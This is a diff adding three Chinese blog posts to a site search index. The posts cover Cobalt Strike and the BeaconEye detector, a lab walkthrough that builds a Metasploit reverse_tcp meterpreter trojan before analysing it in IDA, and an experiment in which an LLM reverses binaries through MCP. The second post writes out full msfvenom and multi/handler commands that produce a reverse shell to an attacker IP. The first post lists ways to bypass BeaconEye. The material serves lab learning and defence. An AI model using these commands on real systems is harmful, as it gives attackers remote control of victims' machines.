@@ -1086,4 +1086,160 @@
         <tag>域渗透</tag>
       </tags>
   </entry>
+  <entry>
+    <title>使用BeaconEye排查cobaltstrike木马</title>
+    <url>/2025/10/04/%E4%BD%BF%E7%94%A8BeaconEye%E6%8E%92%E6%9F%A5cobaltstrike%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<h2 id="什么是cobaltstrike"><a href="#什么是cobaltstrike" class="headerlink" title="什么是cobaltstrike"></a>什么是cobaltstrike</h2><p>Cobalt Strike（简称 CS）是一款基于 Java 开发的<strong>商业级红队&#x2F;渗透测试 C2（Command &amp; Control）框架</strong>，采用 C&#x2F;S 架构：  </p>
+<ul>
+<li><strong>服务端</strong>（team server）唯一，必须运行在 Linux 上，默认监听 50050 端口；  </li>
+<li><strong>客户端</strong>可多个，Windows&#x2F;Linux&#x2F;macOS 均可运行，支持多人协同作战。</li>
+</ul>
+<h3 id="核心能力"><a href="#核心能力" class="headerlink" title="核心能力"></a>核心能力</h3><ol>
+<li><strong>后渗透与横向移动</strong>：内置 Beacon 载荷，支持 HTTP&#x2F;HTTPS&#x2F;DNS&#x2F;SMB 等多种回连协议，具备“低速慢速”异步通信特征，可绕过多数流量检测。  </li>
+<li><strong>武器化生成</strong>：一键生成 Windows EXE&#x2F;DLL、Java、Office 宏、HTA、PowerShell、Payload-in-PDF 等木马，并可与外部漏洞利用模块组合。  </li>
+<li><strong>钓鱼与社工</strong>：集成网站克隆、邮件群发、证书窃取、浏览器中间人劫持、UAC&#x2F;凭据弹窗欺骗等模块，用于模拟 APT 钓鱼入口。  </li>
+<li><strong>内网隧道与代理</strong>：自动端口转发、SOCKS4a&#x2F;HTTP 代理、多层跳板，方便在隔离网段中横向。  </li>
+<li><strong>权限维持与提权</strong>：支持计划任务、服务、WMI、注册表、Logon Script、DCOM 等多种持久化方式；集成 40+ 本地提权 exploit（UAC、内核、AlwaysInstallElevated 等）。  </li>
+<li><strong>域渗透套件</strong>：凭据导出（hash、明文、Kerberos 票据）、Pass-the-Hash&#x2F;Pass-the-Ticket、Golden&#x2F;Silver Ticket、DCSync、BloodHound 结果导入等。  </li>
+<li><strong>流量伪装与对抗</strong>：Malleable C2 配置文件允许自定义 URI、Header、证书、编码&#x2F;加密流程，可把流量伪装成正常网站、云盘、甚至模仿 Zeus、CozyBear 等已知恶意软件特征。  </li>
+<li><strong>日志与报告</strong>：自动记录所有操作、截图、键盘记录，可导出为 ATT&amp;CK 映射报告，方便红队复盘与蓝队演练总结。</li>
+</ol>
+<h3 id="典型使用场景"><a href="#典型使用场景" class="headerlink" title="典型使用场景"></a>典型使用场景</h3><ul>
+<li>红队评估：模拟 APT 攻击链，从入口→立足→横向→域控→数据窃取完整演练。  </li>
+<li>蓝队对抗：检验 EDR、NDR、SIEM 检测规则与应急响应流程。  </li>
+<li>内网审计：在授权情况下，验证内网隔离、补丁管理、最小权限原则有效性。</li>
+</ul>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>Cobalt Strike 为<strong>商业收费软件</strong>（单授权年费数千美元），但网络上存在大量破解版，因此被黑灰产与真实 APT 组织广泛滥用。官方版本已加入水印、License 校验与云端溯源机制，<strong>非法使用存在被追踪风险</strong>。在中国，任何未授权的网络攻击行为均触犯《刑法》第 285、286 条，<strong>仅限在封闭靶场或客户书面授权范围内使用</strong>。</p>
+<h2 id="什么是BeaconEye"><a href="#什么是BeaconEye" class="headerlink" title="什么是BeaconEye"></a>什么是BeaconEye</h2><p>BeaconEye 是一款专门用于<strong>检测和监控 Cobalt Strike Beacon</strong> 的开源安全工具，由安全研究者 @<em>EthicalChaos</em> 开发，2021 年 8 月首次发布后即因检出率高、绕过难度大而在防御端快速走红。其核心思路是<strong>把“Beacon 配置（Beacon Config）”作为强特征</strong>，通过扫描进程内存或离线 Minidump 文件，定位并解析 Beacon 运行时解密后的配置数据，从而判断目标进程是否被注入 Beacon，同时可提取 C2 地址、命令输出等关键信息。</p>
+<h3 id="1-工作原理"><a href="#1-工作原理" class="headerlink" title="1. 工作原理"></a>1. 工作原理</h3><ul>
+<li>Beacon 在启动时会将一份完整的 TLV 格式配置表（含 C2、URI、心跳间隔、是否启用 sleep_mask 等参数）两次解密到堆内存；BeaconEye 利用 yara 规则匹配这块“解密后、使用前”的配置结构即可瞬间锁定 Beacon。</li>
+<li>工具附带调试器功能，可在活进程上动态挂钩，实时解密 HTTP&#x2F;HTTPS Beacon 的 AES 会话密钥，把攻击者下发的命令与回显落地成日志，实现“上帝视角”取证。</li>
+</ul>
+<h3 id="2-主要功能"><a href="#2-主要功能" class="headerlink" title="2. 主要功能"></a>2. 主要功能</h3><ul>
+<li>扫描运行进程或离线 dump：支持按进程名过滤，可批量审计终端或服务器内存镜像。</li>
+<li>导出 Beacon 配置：自动解析 C2 地址、端口、心跳、User-Agent、PublicKey 等字段。</li>
+<li>监控 C2 交互：实时记录命令输入与输出、屏幕截图，为后续溯源提供原始证据。</li>
+<li>检测隐藏&#x2F;注入 Beacon：对使用了 sleep_mask、进程注入、自定义 loader 的样本同样有效。</li>
+<li>多平台编译：原版基于 .NET ≥4.0，另有 Golang 重写的 EvilEye 供无 .NET 环境使用。</li>
+</ul>
+<h3 id="3-使用场景"><a href="#3-使用场景" class="headerlink" title="3. 使用场景"></a>3. 使用场景</h3><ul>
+<li>企业威胁狩猎：定期巡检关键服务器与终端，发现潜伏 Beacon。</li>
+<li>应急响应：在疑似被攻陷主机上快速确认是否存在 Cobalt Strike 控制通道。</li>
+<li>取证分析：对已获得的内存镜像或 Minidump 文件离线扫描，提取攻击者 C2 信息。</li>
+</ul>
+<h3 id="4-局限与对抗"><a href="#4-局限与对抗" class="headerlink" title="4. 局限与对抗"></a>4. 局限与对抗</h3><ul>
+<li>仅支持 HTTP&#x2F;HTTPS Beacon 的实时流量解密；对 DNS、SMB、TCP Pipe 模式只能做静态检出。</li>
+<li>BeaconEye 的规则高度依赖“标准 TLV 配置”结构，通过自定义 loader、在堆上打乱顺序、手动修改配置长度或把配置挪到栈&#x2F;其他堆块，可实现 Bypass。</li>
+<li>从 CS 4.5 起官方引入 sleep_mask（睡眠时加密堆内存）并持续更新混淆策略，需要防御者及时更新扫描器或配合 yara、ETW、ETI 等多维度规则。</li>
+</ul>
+<p>一句话总结：BeaconEye 就是“专门在内存里找 Cobalt Strike 信标”的猎手工具，凭借对 Beacon Config 的高置信特征匹配，让大量传统隐匿手段失效，是目前蓝队威胁狩猎与应急取证中必备的“探照灯”之一。</p>
+<h2 id="BeaconEye使用"><a href="#BeaconEye使用" class="headerlink" title="BeaconEye使用"></a>BeaconEye使用</h2><ol>
+<li>执行上线。<img src="/../images/%E4%BD%BF%E7%94%A8BeaconEye%E6%8E%92%E6%9F%A5cobaltstrike%E6%9C%A8%E9%A9%AC/image-20251004212757275.png" alt="image-20251004212757275"></li>
+<li>下载。<a href="https://github.com/CCob/BeaconEye/releases/tag/0.3">https://github.com/CCob/BeaconEye/releases/tag/0.3</a></li>
+<li>运行。<img src="/../images/%E4%BD%BF%E7%94%A8BeaconEye%E6%8E%92%E6%9F%A5cobaltstrike%E6%9C%A8%E9%A9%AC/image-20251004212933322.png" alt="image-20251004212933322"></li>
+<li>很奇怪没扫到。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>应急响应</category>
+      </categories>
+      <tags>
+        <tag>应急响应</tag>
+        <tag>蓝队</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用IDA PRO 7.0分析msf生成的exe木马</title>
+    <url>/2025/10/04/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ol>
+<li>kali linux攻击者IP：10.10.10.100</li>
+<li>win7受害者IP：10.10.10.2</li>
+<li>确保主机之间能ping通。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004162601751.png" alt="image-20251004162601751"></li>
+<li>如果kali主机ping不通win7主机，请检查防火墙规则。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004162427496.png" alt="image-20251004162427496"></li>
+</ol>
+<h2 id="使用msfconsole监听木马"><a href="#使用msfconsole监听木马" class="headerlink" title="使用msfconsole监听木马"></a>使用msfconsole监听木马</h2><ol>
+<li>执行<code>msfconsole</code>。进入框架。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004163014757.png" alt="image-20251004163014757"></li>
+<li>执行如下命令。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp   # 必须与 msfvenom 生成木马一致</span><br><span class="line">set LHOST 10.10.10.100                        # 攻击机 IP</span><br><span class="line">set LPORT 4444                                # 攻击机端口</span><br><span class="line">set ExitOnSession true                        # 保持监听，可接多个会话</span><br><span class="line">exploit -j -z                                 # 启用监听 -j 后台任务形式，-z 会话成功后自动放到后台</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004163633188.png" alt="image-20251004163633188"></p>
+<h2 id="使用msfvenom生成木马"><a href="#使用msfvenom生成木马" class="headerlink" title="使用msfvenom生成木马"></a>使用msfvenom生成木马</h2><ol>
+<li>命令格式。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp \</span><br><span class="line">         LHOST=&lt;你的Kali IP&gt; \</span><br><span class="line">         LPORT=&lt;监听端口&gt; \</span><br><span class="line">         -f exe -o &lt;文件名&gt;.exe</span><br></pre></td></tr></table></figure></li>
+<li>测试生成。<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.100 LPORT=4444 -f exe -o payload.exe</code><img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004163915055.png" alt="image-20251004163915055"></li>
+</ol>
+<h2 id="上线测试"><a href="#上线测试" class="headerlink" title="上线测试"></a>上线测试</h2><ol>
+<li>将payload.exe拷贝到win7主机。</li>
+<li>双击执行。</li>
+<li>查看kali主机。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessions -l            # 列出所有会话</span><br><span class="line">sessions -i 1          # 进入编号为 1 的 Meterpreter</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004164256100.png" alt="image-20251004164256100"></p>
+<h2 id="逆向分析exe"><a href="#逆向分析exe" class="headerlink" title="逆向分析exe"></a>逆向分析exe</h2><ol>
+<li>打开ida.exe，打开payload.exe。<img src="/../images/%E4%BD%BF%E7%94%A8IDA-PRO-7-0%E5%88%86%E6%9E%90msf%E7%94%9F%E6%88%90%E7%9A%84exe%E6%9C%A8%E9%A9%AC/image-20251004164516071.png" alt="image-20251004164516071"></li>
+</ol>
+]]></content>
+      <categories>
+        <category>逆向分析</category>
+      </categories>
+      <tags>
+        <tag>蓝队</tag>
+        <tag>溯源反制</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用MCP自动化调用IDA进行逆向分析</title>
+    <url>/2025/10/06/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ol>
+<li>Cherry-Studio</li>
+<li>IDA 9.0</li>
+<li>python-3.11.1</li>
+</ol>
+<h2 id="安装ida-pro-mcp"><a href="#安装ida-pro-mcp" class="headerlink" title="安装ida-pro-mcp"></a>安装ida-pro-mcp</h2><ol>
+<li>执行<code>pip install ida-pro-mcp</code></li>
+<li>执行<code>ida-pro-mcp --install</code></li>
+<li>重启ida，看到mcp插件，则说明安装成功。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007173311270.png" alt="image-20251007173311270"></li>
+<li>第3步骤遇到问题，报错如下。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/ida-pro-mcp%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5.png" alt="ida-pro-mcp安装失败"></li>
+<li>原来是缺少git，安装git之后，重新执行<code>ida-pro-mcp --install</code>，看到如下输出应该就是安装成功了。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007173634004.png" alt="image-20251007173634004"></li>
+</ol>
+<h2 id="配置Cherry"><a href="#配置Cherry" class="headerlink" title="配置Cherry"></a>配置Cherry</h2><ol>
+<li>打开Cherry的设置。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007174046913.png" alt="image-20251007174046913"></li>
+<li>复制配置文件</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;mcpServers&quot;: &#123;</span><br><span class="line">    &quot;github.com/mrexodia/ida-pro-mcp&quot;: &#123;</span><br><span class="line">      &quot;isActive&quot;: true,</span><br><span class="line">      &quot;command&quot;: &quot;D:\\python3.11\\python.exe&quot;,</span><br><span class="line">      &quot;args&quot;: [</span><br><span class="line">        &quot;D:\\python3.11\\Lib\\site-packages\\ida_pro_mcp\\server.py&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;timeout&quot;: 1800,</span><br><span class="line">      &quot;disabled&quot;: false,</span><br><span class="line">      &quot;autoApprove&quot;: [</span><br><span class="line">        &quot;check_connection&quot;,</span><br><span class="line">        &quot;get_metadata&quot;,</span><br><span class="line">        &quot;get_function_by_name&quot;,</span><br><span class="line">        &quot;get_function_by_address&quot;,</span><br><span class="line">        &quot;get_current_address&quot;,</span><br><span class="line">        &quot;get_current_function&quot;,</span><br><span class="line">        &quot;convert_number&quot;,</span><br><span class="line">        &quot;list_functions&quot;,</span><br><span class="line">        &quot;list_strings&quot;,</span><br><span class="line">        &quot;search_strings&quot;,</span><br><span class="line">        &quot;decompile_function&quot;,</span><br><span class="line">        &quot;disassemble_function&quot;,</span><br><span class="line">        &quot;get_xrefs_to&quot;,</span><br><span class="line">        &quot;get_entry_points&quot;,</span><br><span class="line">        &quot;set_comment&quot;,</span><br><span class="line">        &quot;rename_local_variable&quot;,</span><br><span class="line">        &quot;rename_global_variable&quot;,</span><br><span class="line">        &quot;set_global_variable_type&quot;,</span><br><span class="line">        &quot;rename_function&quot;,</span><br><span class="line">        &quot;set_function_prototype&quot;,</span><br><span class="line">        &quot;declare_c_type&quot;,</span><br><span class="line">        &quot;set_local_variable_type&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;alwaysAllow&quot;: [</span><br><span class="line">        &quot;check_connection&quot;,</span><br><span class="line">        &quot;get_metadata&quot;,</span><br><span class="line">        &quot;get_function_by_name&quot;,</span><br><span class="line">        &quot;get_function_by_address&quot;,</span><br><span class="line">        &quot;get_current_address&quot;,</span><br><span class="line">        &quot;get_current_function&quot;,</span><br><span class="line">        &quot;convert_number&quot;,</span><br><span class="line">        &quot;list_functions&quot;,</span><br><span class="line">        &quot;list_strings&quot;,</span><br><span class="line">        &quot;search_strings&quot;,</span><br><span class="line">        &quot;decompile_function&quot;,</span><br><span class="line">        &quot;disassemble_function&quot;,</span><br><span class="line">        &quot;get_xrefs_to&quot;,</span><br><span class="line">        &quot;get_entry_points&quot;,</span><br><span class="line">        &quot;set_comment&quot;,</span><br><span class="line">        &quot;rename_local_variable&quot;,</span><br><span class="line">        &quot;rename_global_variable&quot;,</span><br><span class="line">        &quot;set_global_variable_type&quot;,</span><br><span class="line">        &quot;rename_function&quot;,</span><br><span class="line">        &quot;set_function_prototype&quot;,</span><br><span class="line">        &quot;declare_c_type&quot;,</span><br><span class="line">        &quot;set_local_variable_type&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;name&quot;: &quot;ida-pro-mcp&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>点击编辑，粘贴配置文件进去，注意<code>command</code>和<code>args</code>键的值要替换成你的环境的值。配置完成后能看到个绿色的电脑✔<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007174329329.png" alt="image-20251007174329329"></li>
+<li>启动Cherry，点击默认助手，选择MCP服务器，点击启用。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007175404509.png" alt="image-20251007175404509"></li>
+</ol>
+<h2 id="测试CTF题目"><a href="#测试CTF题目" class="headerlink" title="测试CTF题目"></a>测试CTF题目</h2><ol>
+<li><p>使用攻防世界的题目做测试（<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a></p>
+</li>
+<li><p>这里下载题目easyRE1做测试。</p>
+</li>
+<li><p>把题目文件拖进ida，选择MCP插件，左下角输出监听端口，如果提示端口被占用，请杀掉占用的程序再继续。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007175643749.png" alt="image-20251007175643749"></p>
+</li>
+<li><p>开始分析，发现需要API密钥。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007180001212.png" alt="image-20251007180001212"></p>
+</li>
+<li><p>根据提示获取密钥，填写密钥之后还是报同样的错误。</p>
+</li>
+<li><p>返回检查mcp服务器配置。发现报错。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007191412340.png" alt="image-20251007191412340"></p>
+</li>
+<li><p>怀疑是ida-pro-mcp的服务没连接上，因为我看别人文章说要安装python3.12版本，我之前执行过3.12的ida-pro-mcp安装，所以卸载python3.12，并且删除相关的环境变量，重新安装ida-pro-mcp，再执行ida-pro-mcp –install，看见如下输出就好了。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007192505961.png" alt="image-20251007192505961"></p>
+</li>
+<li><p>继续返回聊天页面，输入提示词“ida打开了一个文件，这是一道ctf题目，请尝试帮我找出flag”，可以看到成功分析出flag。</p>
+</li>
+</ol>
+<h2 id="进行cobaltstrike木马分析"><a href="#进行cobaltstrike木马分析" class="headerlink" title="进行cobaltstrike木马分析"></a>进行cobaltstrike木马分析</h2><ol>
+<li>先用cobaltstrike生成exe木马。</li>
+<li>把exe木马程序拖进ida，打开mcp插件。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007192936415.png" alt="image-20251007192936415"></li>
+<li>聊天输入提示词“ida打开了一个exe木马文件，请尝试帮我分析出木马的基本功能和木马的c2服务器ip地址”，ai开始自动分析，结果如图。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007193705894.png" alt="image-20251007193705894"></li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>ai貌似只能做一些基础的分析，例如字符串搜索，连最普通的cs马的c2服务器ip地址都分析不出来。最后附一张deepseek调用token的截图。分析两个程序花了0.08元。<img src="/../images/%E4%BD%BF%E7%94%A8MCP%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8IDA%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/image-20251007194145085.png" alt="image-20251007194145085"></p>
+]]></content>
+      <categories>
+        <category>逆向分析</category>
+      </categories>
+      <tags>
+        <tag>mcp</tag>
+        <tag>自动化分析</tag>
+      </tags>
+  </entry>
 </search>
